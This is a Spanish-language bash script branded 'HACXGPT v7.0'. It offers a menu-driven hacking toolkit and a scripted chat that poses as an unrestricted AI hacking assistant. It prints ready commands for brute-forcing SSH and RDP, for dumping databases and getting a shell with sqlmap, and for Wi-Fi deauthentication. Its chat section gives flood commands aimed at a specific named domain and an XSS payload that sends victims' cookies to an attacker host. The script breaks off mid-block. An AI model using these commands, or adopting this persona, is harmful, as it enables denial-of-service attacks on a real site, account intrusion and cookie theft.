#!/bin/bash
# HACXGPT v7.0 COMPLETO - TODAS LAS FUNCIONES IMPLEMENTADAS

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

clear_screen() {
    clear
}

show_banner() {
    clear_screen
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║              ${CYAN}🛡️ HACXGPT v7.0${PURPLE}                 ║${NC}"
    echo -e "${PURPLE}║     ${GREEN}CHAT LIBRE CON RESPUESTAS TÉCNICAS${PURPLE}      ║${NC}"
    echo -e "${PURPLE}║         ${YELLOW}100% FUNCIONAL - COMPLETO${PURPLE}          ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================
# 1. RECONOCIMIENTO BÁSICO (IMPLEMENTADO)
# ============================================
reconocimiento_basico() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║         ${GREEN}🎯 RECONOCIMIENTO BÁSICO${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔍 HERRAMIENTAS DE RECONOCIMIENTO:${NC}"
        echo ""
        echo "1. Información WHOIS de dominio"
        echo "2. Consultas DNS (nslookup)"
        echo "3. Consultas DNS avanzadas (dig)"
        echo "4. Buscar subdominios"
        echo "5. Información de IP"
        echo "6. Búsqueda de emails"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 Dominio para WHOIS: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: whois $dominio${NC}"
                    echo ""
                    whois $dominio | head -50
                fi
                ;;
            2)
                read -p "🌐 Dominio para NSLOOKUP: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: nslookup $dominio${NC}"
                    echo ""
                    nslookup $dominio
                fi
                ;;
            3)
                read -p "🌐 Dominio para DIG: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: dig $dominio ANY${NC}"
                    echo ""
                    dig $dominio ANY +short
                fi
                ;;
            4)
                read -p "🌐 Dominio para buscar subdominios: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA SUBDOMINIOS:${NC}"
                    echo ""
                    echo "• subfinder -d $dominio"
                    echo "• assetfinder --subs-only $dominio"
                    echo "• amass enum -d $dominio"
                    echo "• gau $dominio | cut -d '/' -f3 | sort -u"
                fi
                ;;
            5)
                read -p "📡 Dirección IP para información: " ip
                if [ -n "$ip" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA IP $ip:${NC}"
                    echo ""
                    echo "• whois $ip"
                    echo "• nslookup $ip"
                    echo "• curl ipinfo.io/$ip"
                    echo "• ping -c 4 $ip"
                fi
                ;;
            6)
                read -p "📧 Dominio para buscar emails: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR EMAILS:${NC}"
                    echo ""
                    echo "• theHarvester -d $dominio -b google"
                    echo "• hunter.io (herramienta web)"
                    echo "• phonebook.cz"
                    echo "• linkedin.com (búsqueda manual)"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 2. ESCANEO WEB (IMPLEMENTADO)
# ============================================
escaneo_web() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║            ${GREEN}🌐 ESCANEO WEB${CYAN}                   ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🛠️ HERRAMIENTAS DE ESCANEO WEB:${NC}"
        echo ""
        echo "1. Detectar tecnologías (whatweb)"
        echo "2. Escanear vulnerabilidades (nikto)"
        echo "3. Buscar directorios (dirb/gobuster)"
        echo "4. Analizar headers HTTP"
        echo "5. Probar métodos HTTP"
        echo "6. SSL/TLS análisis"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 URL para whatweb (ej: https://ejemplo.com): " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: whatweb $url${NC}"
                    echo ""
                    whatweb $url
                fi
                ;;
            2)
                read -p "🌐 URL para nikto (ej: https://ejemplo.com): " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: nikto -h $url${NC}"
                    echo ""
                    nikto -h $url 2>/dev/null || echo "Instala nikto: sudo apt install nikto"
                fi
                ;;
            3)
                read -p "🌐 URL para buscar directorios: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR DIRECTORIOS:${NC}"
                    echo ""
                    echo "• gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt"
                    echo "• dirb $url"
                    echo "• ffuf -u $url/FUZZ -w /usr/share/wordlists/dirb/common.txt"
                    echo "• dirsearch -u $url -e php,html,js,txt"
                fi
                ;;
            4)
                read -p "🌐 URL para analizar headers: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: curl -I $url${NC}"
                    echo ""
                    curl -I $url
                fi
                ;;
            5)
                read -p "🌐 URL para probar métodos HTTP: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA MÉTODOS HTTP:${NC}"
                    echo ""
                    echo "• curl -X OPTIONS $url"
                    echo "• nmap --script http-methods --script-args http-methods.url-path='/' $url"
                    echo "• httprint -h $url -s /usr/share/httprint/signatures.txt"
                fi
                ;;
            6)
                read -p "🌐 Dominio para análisis SSL: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA SSL/TLS:${NC}"
                    echo ""
                    echo "• sslscan $dominio"
                    echo "• testssl.sh $dominio"
                    echo "• nmap --script ssl-enum-ciphers -p 443 $dominio"
                    echo "• openssl s_client -connect $dominio:443 -servername $dominio"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 3. ANÁLISIS DE RED (IMPLEMENTADO)
# ============================================
analisis_red() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📡 ANÁLISIS DE RED${CYAN}                ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📊 HERRAMIENTAS DE ANÁLISIS DE RED:${NC}"
        echo ""
        echo "1. Escaneo básico de puertos (nmap)"
        echo "2. Escaneo avanzado de servicios"
        echo "3. Ping a objetivo"
        echo "4. Traceroute a objetivo"
        echo "5. Netstat (conexiones actuales)"
        echo "6. Capturar tráfico (tcpdump)"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para nmap (IP o dominio): " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS NMAP BÁSICOS:${NC}"
                    echo ""
                    echo "• Escaneo rápido: nmap -F $objetivo"
                    echo "• Detectar OS: nmap -O $objetivo"
                    echo "• Todos los puertos: nmap -p- $objetivo"
                    echo "• Con scripts: nmap -sC $objetivo"
                fi
                ;;
            2)
                read -p "🎯 Objetivo para escaneo avanzado: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS ESCANEO AVANZADO:${NC}"
                    echo ""
                    echo "• Versiones de servicio: nmap -sV $objetivo"
                    echo "• Scripts de vulnerabilidad: nmap --script vuln $objetivo"
                    echo "• Escaneo UDP: nmap -sU -p 1-100 $objetivo"
                    echo "• Timing agresivo: nmap -T4 -A $objetivo"
                fi
                ;;
            3)
                read -p "🎯 Objetivo para ping: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: ping -c 4 $objetivo${NC}"
                    echo ""
                    ping -c 4 $objetivo
                fi
                ;;
            4)
                read -p "🎯 Objetivo para traceroute: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: traceroute $objetivo${NC}"
                    echo ""
                    traceroute $objetivo 2>/dev/null || echo "Usando tracert..."
                    tracert $objetivo 2>/dev/null || echo "Comando no disponible"
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 COMANDOS NETSTAT:${NC}"
                echo ""
                echo "• Conexiones activas: netstat -tulpn"
                echo "• Todas las conexiones: netstat -ano"
                echo "• Estadísticas: netstat -s"
                echo "• Rutas: netstat -r"
                ;;
            6)
                read -p "🎯 Interfaz para capturar (ej: eth0): " interfaz
                if [ -n "$interfaz" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS TCPDUMP:${NC}"
                    echo ""
                    echo "• Capturar todo: sudo tcpdump -i $interfaz"
                    echo "• Guardar a archivo: sudo tcpdump -i $interfaz -w captura.pcap"
                    echo "• Filtrar por puerto: sudo tcpdump -i $interfaz port 80"
                    echo "• Filtrar por IP: sudo tcpdump -i $interfaz host 192.168.1.1"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 4. SUITE DE PENTESTING (IMPLEMENTADO)
# ============================================
suite_pentesting() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}⚔️ SUITE DE PENTESTING${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔧 HERRAMIENTAS DE PENTESTING:${NC}"
        echo ""
        echo "1. Metasploit Framework"
        echo "2. SQL Injection (sqlmap)"
        echo "3. Fuerza Bruta (hydra)"
        echo "4. XSS Testing (XSStrike)"
        echo "5. Wifi Hacking (aircrack)"
        echo "6. John The Ripper"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                echo ""
                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK:${NC}"
                echo ""
                echo "• Iniciar: msfconsole"
                echo "• Buscar exploit: search [nombre]"
                echo "• Usar exploit: use exploit/[ruta]"
                echo "• Mostrar opciones: show options"
                echo "• Configurar: set RHOSTS [IP]"
                echo "• Ejecutar: exploit"
                echo ""
                echo -e "${BLUE}📚 EJEMPLOS:${NC}"
                echo "• EternalBlue: use exploit/windows/smb/ms17_010_eternalblue"
                echo "• Reverse Shell: use exploit/multi/handler"
                ;;
            2)
                read -p "🌐 URL para sqlmap (ej: http://sitio.com?id=1): " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 SQLMAP COMANDOS:${NC}"
                    echo ""
                    echo "• Detectar: sqlmap -u \"$url\""
                    echo "• Obtener bases de datos: sqlmap -u \"$url\" --dbs"
                    echo "• Obtener tablas: sqlmap -u \"$url\" -D [db] --tables"
                    echo "• Dump de datos: sqlmap -u \"$url\" -D [db] -T [tabla] --dump"
                    echo "• Shell: sqlmap -u \"$url\" --os-shell"
                fi
                ;;
            3)
                read -p "🎯 Objetivo para fuerza bruta (ej: ssh://192.168.1.1): " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 HYDRA COMANDOS:${NC}"
                    echo ""
                    echo "• SSH: hydra -l usuario -P passlist.txt ssh://$objetivo"
                    echo "• FTP: hydra -l usuario -P passlist.txt ftp://$objetivo"
                    echo "• HTTP POST: hydra -l admin -P passlist.txt $objetivo http-post-form"
                    echo "• RDP: hydra -l administrador -P passlist.txt rdp://$objetivo"
                fi
                ;;
            4)
                read -p "🌐 URL para XSS testing: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 XSSTRIKE COMANDOS:${NC}"
                    echo ""
                    echo "• Escaneo básico: python3 xsstrike.py -u \"$url\""
                    echo "• Crawling: python3 xsstrike.py -u \"$url\" --crawl"
                    echo "• Blind XSS: python3 xsstrike.py -u \"$url\" --blind"
                    echo "• Con parámetros: python3 xsstrike.py -u \"$url?param=value\""
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 WIFI HACKING COMANDOS:${NC}"
                echo ""
                echo "• Ver interfaces: airmon-ng"
                echo "• Modo monitor: airmon-ng start wlan0"
                echo "• Capturar handshake: airodump-ng wlan0mon"
                echo "• Ataque deauth: aireplay-ng --deauth 10 -a [BSSID] wlan0mon"
                echo "• Crackear: aircrack-ng -w rockyou.txt captura-01.cap"
                ;;
            6)
                read -p "🔑 Archivo hash para John: " archivo_hash
                if [ -n "$archivo_hash" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 JOHN THE RIPPER COMANDOS:${NC}"
                    echo ""
                    echo "• Identificar hash: john --format=? --list=formats"
                    echo "• Ataque de diccionario: john --format=[FORMATO] --wordlist=rockyou.txt $archivo_hash"
                    echo "• Ataque incremental: john --format=[FORMATO] --incremental $archivo_hash"
                    echo "• Mostrar passwords: john --show $archivo_hash"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 5. GENERAR REPORTES (IMPLEMENTADO)
# ============================================
generar_reportes() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES${CYAN}               ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📝 FORMATOS DE REPORTE:${NC}"
        echo ""
        echo "1. Crear reporte HTML básico"
        echo "2. Crear reporte en texto"
        echo "3. Crear reporte en PDF"
        echo "4. Reporte de vulnerabilidades"
        echo "5. Plantillas personalizadas"
        echo "6. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-6]: " opcion
        
        case $opcion in
            1)
                read -p "📄 Nombre del reporte HTML (sin extensión): " nombre
                if [ -n "$nombre" ]; then
                    echo ""
                    echo -e "${YELLOW}📝 CREANDO REPORTE HTML:${NC}"
                    echo ""
                    cat > "${nombre}.html" << HTMLREPORT
<!DOCTYPE html>
<html>
<head>
    <title>Reporte de Seguridad - $(date)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .section { margin: 20px 0; padding: 15px; background: #f5f5f5; }
        .finding { background: #fff3cd; padding: 10px; margin: 10px 0; }
        .critical { border-left: 5px solid #dc3545; }
        .high { border-left: 5px solid #fd7e14; }
        .medium { border-left: 5px solid #ffc107; }
        .low { border-left: 5px solid #28a745; }
    </style>
</head>
<body>
    <h1>🔐 Reporte de Seguridad</h1>
    <p><strong>Fecha:</strong> $(date)</p>
    <p><strong>Generado por:</strong> HacXGPT v7.0</p>
    
    <div class="section">
        <h2>📋 Resumen Ejecutivo</h2>
        <p>Este reporte contiene los hallazgos de seguridad identificados durante la evaluación.</p>
    </div>
    
    <div class="section">
        <h2>🎯 Hallazgos</h2>
        <div class="finding critical">
            <h3>🛑 CRÍTICO: Vulnerabilidad X</h3>
            <p><strong>Descripción:</strong> Descripción detallada...</p>
            <p><strong>Recomendación:</strong> Recomendación de remediación...</p>
        </div>
        <div class="finding high">
            <h3>⚠️ ALTO: Vulnerabilidad Y</h3>
            <p>Descripción...</p>
        </div>
    </div>
    
    <div class="section">
        <h2>📊 Métricas</h2>
        <p>Total de hallazgos: 5</p>
        <p>Críticos: 1 | Altos: 2 | Medios: 1 | Bajos: 1</p>
    </div>
    
    <div class="section">
        <h2>🔧 Herramientas Utilizadas</h2>
        <ul>
            <li>Nmap - Escaneo de puertos</li>
            <li>Nikto - Escaneo web</li>
            <li>SQLMap - Testing SQL Injection</li>
            <li>Metasploit - Explotación</li>
        </ul>
    </div>
</body>
</html>
HTMLREPORT
                    echo -e "${GREEN}✅ Reporte HTML creado: ${nombre}.html${NC}"
                fi
                ;;
            2)
                read -p "📄 Nombre del reporte en texto: " nombre
                if [ -n "$nombre" ]; then
                    echo ""
                    echo -e "${YELLOW}📝 CREANDO REPORTE DE TEXTO:${NC}"
                    echo ""
                    cat > "${nombre}.txt" << TEXTREPORT
================================================================
                    REPORTE DE SEGURIDAD
================================================================
Fecha: $(date)
Generado por: HacXGPT v7.0

RESUMEN EJECUTIVO
=================
Este documento contiene los hallazgos de seguridad identificados
durante la evaluación técnica.

HALLAZGOS
=========
[+] CRÍTICO: Vulnerabilidad X
    • Descripción: Servicio vulnerable a RCE
    • Impacto: Alto - Posible compromiso total
    • Recomendación: Actualizar a versión 2.0.1

[+] ALTO: Configuración insegura
    • Descripción: Credenciales por defecto
    • Impacto: Medio - Acceso no autorizado
    • Recomendación: Cambiar credenciales

HERRAMIENTAS UTILIZADAS
=======================
- Nmap 7.91
- Nikto 2.1.6
- SQLMap 1.5.2
- Metasploit 6.0

CONCLUSIONES
============
Se recomienda implementar las correcciones en un plazo de 30 días.
TEXTREPORT
                    echo -e "${GREEN}✅ Reporte de texto creado: ${nombre}.txt${NC}"
                fi
                ;;
            3)
                echo ""
                echo -e "${YELLOW}📝 PARA CREAR PDFS:${NC}"
                echo ""
                echo "• Instalar wkhtmltopdf:"
                echo "  sudo apt install wkhtmltopdf"
                echo ""
                echo "• Convertir HTML a PDF:"
                echo "  wkhtmltopdf reporte.html reporte.pdf"
                echo ""
                echo "• Usar pandoc (más formatos):"
                echo "  pandoc reporte.md -o reporte.pdf"
                ;;
            4)
                echo ""
                echo -e "${YELLOW}📊 PLANTILLAS DE VULNERABILIDADES:${NC}"
                echo ""
                echo "1. SQL Injection:"
                echo "   • CVSS: 9.8 (CRÍTICO)"
                echo "   • CWE: CWE-89"
                echo "   • Remedio: Prepared Statements"
                echo ""
                echo "2. XSS:"
                echo "   • CVSS: 7.5 (ALTO)"
                echo "   • CWE: CWE-79"
                echo "   • Remedio: Output Encoding"
                echo ""
                echo "3. CSRF:"
                echo "   • CVSS: 8.0 (ALTO)"
                echo "   • CWE: CWE-352"
                echo "   • Remedio: Tokens Anti-CSRF"
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🎨 PERSONALIZACIÓN DE REPORTES:${NC}"
                echo ""
                echo "• Agregar logo de empresa"
                echo "• Colores corporativos"
                echo "• Secciones personalizadas"
                echo "• Firmas digitales"
                echo "• Métricas específicas"
                ;;
            6)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 6. HERRAMIENTAS AVANZADAS (IMPLEMENTADO)
# ============================================
herramientas_avanzadas() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔧 HERRAMIENTAS AVANZADAS${CYAN}           ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}⚙️ HERRAMIENTAS ESPECIALIZADAS:${NC}"
        echo ""
        echo "1. Análisis de malware"
        echo "2. Ingeniería inversa"
        echo "3. Forense digital"
        echo "4. OSINT (Inteligencia abierta)"
        echo "5. Automatización de tareas"
        echo "6. Desarrollo de exploits"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                echo ""
                echo -e "${YELLOW}🦠 ANÁLISIS DE MALWARE:${NC}"
                echo ""
                echo "• VirusTotal: analyze archivo.exe"
                echo "• Strings analysis: strings archivo.exe"
                echo "• PE analysis: peframe archivo.exe"
                echo "• Sandbox: cuckoo sandbox"
                echo "• YARA rules: yara -r reglas.yara directorio/"
                ;;
            2)
                echo ""
                echo -e "${YELLOW}🔬 INGENIERÍA INVERSA:${NC}"
                echo ""
                echo "• Desensamblar: objdump -d archivo"
                echo "• Debugging: gdb archivo"
                echo "• Análisis estático: radare2 archivo"
                echo "• Decompilar: Ghidra, IDA Pro"
                echo "• Análisis de binarios: binwalk archivo"
                ;;
            3)
                echo ""
                echo -e "${YELLOW}🔍 FORENSE DIGITAL:${NC}"
                echo ""
                echo "• Imágenes de disco: dd if=/dev/sda of=imagen.dd"
                echo "• Análisis de memoria: volatility -f memory.dump"
                echo "• Recuperación de archivos: photorec"
                echo "• Análisis de logs: log2timeline"
                echo "• Autopsy: interfaz gráfica forense"
                ;;
            4)
                echo ""
                echo -e "${YELLOW}🌐 OSINT - INTELIGENCIA ABIERTA:${NC}"
                echo ""
                echo "• Recon-ng: framework OSINT"
                echo "• Maltego: visualización de datos"
                echo "• Shodan: shodan search apache"
                echo "• theHarvester: búsqueda de emails"
                echo "• spiderfoot: automatización OSINT"
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🤖 AUTOMATIZACIÓN:${NC}"
                echo ""
                echo "• Scripting: bash, python, powershell"
                echo "• Automatización: ansible, chef, puppet"
                echo "• Orchestration: terraform"
                echo "• CI/CD: Jenkins, GitLab CI"
                echo "• Containers: Docker, Kubernetes"
                ;;
            6)
                echo ""
                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS:${NC}"
                echo ""
                echo "• Pattern creation: msf-pattern_create"
                echo "• Offset calculation: msf-pattern_offset"
                echo "• Shellcode generation: msfvenom"
                echo "• Debugging: Immunity Debugger, x64dbg"
                echo "• Fuzzing: AFL, boofuzz"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 7. CHAT LIBRE (YA IMPLEMENTADO)
# ============================================
chat_libre() {
    # TU CÓDIGO ACTUAL DEL CHAT LIBRE - mantenerlo igual
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}💬 CHAT LIBRE TÉCNICO${CYAN}              ║${NC}"
        echo -e "${CYAN}║     ${YELLOW}Pregunta sobre técnicas de hacking${CYAN}     ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📚 TEMAS DISPONIBLES:${NC}"
        echo -e "${BLUE}• botnet${NC} - Redes de bots y DDoS"
        echo -e "${BLUE}• ddos${NC}   - Ataques de denegación"
        echo -e "${BLUE}• sql${NC}    - SQL Injection"
        echo -e "${BLUE}• nmap${NC}   - Escaneo de puertos"
        echo -e "${BLUE}• xss${NC}    - Cross-Site Scripting"
        echo -e "${BLUE}• phishing${NC} - Ingeniería social"
        echo ""
        echo -e "${YELLOW}💬 Ejemplo: 'botnet sobre ztlab.com.ar'${NC}"
        echo -e "${YELLOW}            'como hacer ddos'${NC}"
        echo -e "${YELLOW}            'sql injection técnicas'${NC}"
        echo ""
        echo -e "${RED}📝 Escribe 'salir' para volver al menú${NC}"
        echo ""
        
        read -p "❓ Tu pregunta: " pregunta
        
        pregunta_lower=$(echo "$pregunta" | tr '[:upper:]' '[:lower:]')
        
        if [[ "$pregunta_lower" == "salir" ]]; then
            echo ""
            echo "Regresando al menú principal..."
            sleep 1
            return
        fi
        
        echo ""
        echo "🤖 HacXGPT:"
        echo "══════════════════════════════════════════════"
        
        # BOTNET
        if [[ "$pregunta_lower" == *"botnet"* ]]; then
            echo "🔐 BOTNETS - TÉCNICAS COMPLETAS"
            echo ""
            echo "📚 TEORÍA:"
            echo "- Red de dispositivos infectados (bots)"
            echo "- Controlados desde servidor C&C"
            echo "- Usos: DDoS, spam, minería"
            echo ""
            echo "⚔️ TÉCNICAS OFENSIVAS (SOLO EDUCACIÓN):"
            echo "1. INFECCIÓN:"
            echo "- Exploit kits en sitios web"
            echo "- Phishing con malware"
            echo "- Descargas drive-by"
            echo ""
            echo "2. C&C (COMMAND & CONTROL):"
            echo "- HTTP/HTTPS a dominios"
            echo "- DNS tunneling"
            echo "- P2P para resiliencia"
            echo ""
            echo "3. ATAQUE DDoS CONTRA ztlab.com.ar:"
            echo "- SYN Flood: hping3 -S -p 443 --flood www.ztlab.com.ar"
            echo "- HTTP Flood: bombardier -c 1000 -d 60s https://www.ztlab.com.ar"
            echo "- Slowloris: python3 slowloris.py www.ztlab.com.ar"
            echo ""
            echo "🔧 COMANDOS PRÁCTICOS (LABORATORIO):"
            echo "- hping3 --syn --flood --rand-source -p 443 [IP_PRUEBA]"
            echo "- tcpdump -i eth0 'dst port 443' -w trafico.pcap"
            echo "- tshark -r trafico.pcap -Y 'tcp.flags.syn==1'"
            echo ""
            echo "🛡️ DEFENSA:"
            echo "- Cloudflare WAF"
            echo "- Rate limiting"
            echo "- Monitorización"
            echo ""
            echo "⚖️ LEGALIDAD:"
            echo "- SOLO con autorización escrita"
            echo "- Solo en laboratorios controlados"
            echo "- Reportar vulnerabilidades"
        
        # DDOS
        elif [[ "$pregunta_lower" == *"ddos"* ]] || [[ "$pregunta_lower" == *"denegacion"* ]]; then
            echo "🌪️ ATAQUES DDOS - TÉCNICAS"
            echo ""
            echo "📊 TIPOS:"
            echo "- SYN Flood (Layer 4)"
            echo "- HTTP Flood (Layer 7)"
            echo "- Slowloris"
            echo "- Amplificación DNS/NTP"
            echo ""
            echo "🔧 COMANDOS:"
            echo "- hping3 -S -p 80 --flood [OBJETIVO]"
            echo "- bombardier -c 1000 [URL]"
            echo "- python3 slowloris.py [OBJETIVO]"
            echo ""
            echo "🛡️ PROTECCIÓN:"
            echo "- CDN (Cloudflare)"
            echo "- WAF"
            echo "- Rate limiting"
        
        # SQL INJECTION
        elif [[ "$pregunta_lower" == *"sql"* ]] || [[ "$pregunta_lower" == *"inyeccion"* ]]; then
            echo "💉 SQL INJECTION - EXPLOTACIÓN"
            echo ""
            echo "⚔️ TÉCNICAS:"
            echo "- ' OR '1'='1"
            echo "- ' UNION SELECT NULL--"
            echo "- ' UNION SELECT version(),NULL--"
            echo ""
            echo "🔧 SQLMAP COMPLETO:"
            echo "1. sqlmap -u 'http://sitio.com?id=1'"
            echo "2. sqlmap -u URL --dbs"
            echo "3. sqlmap -u URL -D database --tables"
            echo "4. sqlmap -u URL -D db -T users --dump"
            echo ""
            echo "🛡️ PREVENCIÓN:"
            echo "- Prepared statements"
            echo "- Input validation"
            echo "- Least privilege"
        
        # NMAP
        elif [[ "$pregunta_lower" == *"nmap"* ]] || [[ "$pregunta_lower" == *"escaneo"* ]]; then
            echo "🔍 NMAP - ESCANEO PROFESIONAL"
            echo ""
            echo "⚙️ COMANDOS ESENCIALES:"
            echo "- nmap -sS -sV -p- [OBJETIVO]"
            echo "- nmap -sS -T2 [OBJETIVO] (sigiloso)"
            echo "- nmap -A -T4 [OBJETIVO] (agresivo)"
            echo "- nmap -sU [OBJETIVO] (UDP - lento)"
            echo ""
            echo "🎯 TÉCNICAS ESPECIALES:"
            echo "- Fragmentación: nmap -f"
            echo "- Decoys: nmap -D RND:10"
            echo "- Timing: -T0 a -T5"
        
        # XSS
        elif [[ "$pregunta_lower" == *"xss"* ]]; then
            echo "🎯 XSS (CROSS-SITE SCRIPTING)"
            echo ""
            echo "💣 PAYLOADS:"
            echo "- <script>alert(1)</script>"
            echo "- <img src=x onerror=alert(1)>"
            echo "- <script>fetch('https://attacker.com/?c='+document.cookie)</script>"
            echo ""
            echo "🛠️ HERRAMIENTAS:"
            echo "- XSSstrike"
            echo "- Burp Suite"
            echo "- OWASP ZAP"
            echo ""
            echo "🛡️ MITIGACIÓN:"
            echo "- Content Security Policy"
            echo "- Output encoding"
            echo "- HttpOnly cookies"
        
        # PHISHING
        elif [[ "$pregunta_lower" == *"phishing"* ]]; then
            echo "🎣 PHISHING - INGENIERÍA SOCIAL"
            echo ""
            echo "🔄 TÉCNICAS:"
            echo "- Clonación de sitios"
            echo "- Emails suplantando identidad"
            echo "- SMS phishing (smishing)"
            echo "- Vishing (phishing por voz)"
            echo ""
            echo "🔧 HERRAMIENTAS:"
            echo "- Social-Engineer Toolkit (SET)"
            echo "- Gophish"
            echo "- SimpleEmailSpoofer"
            echo ""
            echo "🛡️ PROTECCIÓN:"
            echo "- Verificar URLs"
            echo "- Autenticación multifactor"
            echo "- Educación del usuario"
        
        # HASH
        elif [[ "$pregunta_lower" == *"hash"* ]] || [[ "$pregunta_lower" == *"descifrar"* ]] || [[ "$pregunta_lower" == *"contraseña"* ]]; then
            echo "🔐 DESCIFRADO DE HASHES"
            echo ""
            echo "📚 TEORÍA:"
            echo "- Hash = función criptográfica unidireccional"
            echo "- Se crackea por fuerza bruta o diccionario"
            echo ""
            echo "🛠️ HERRAMIENTAS:"
            echo "- hashcat -m [TIPO] hash.txt wordlist.txt"
            echo "- john --format=[FORMATO] hash.txt"
            echo "- hash-identifier (para identificar tipo)"
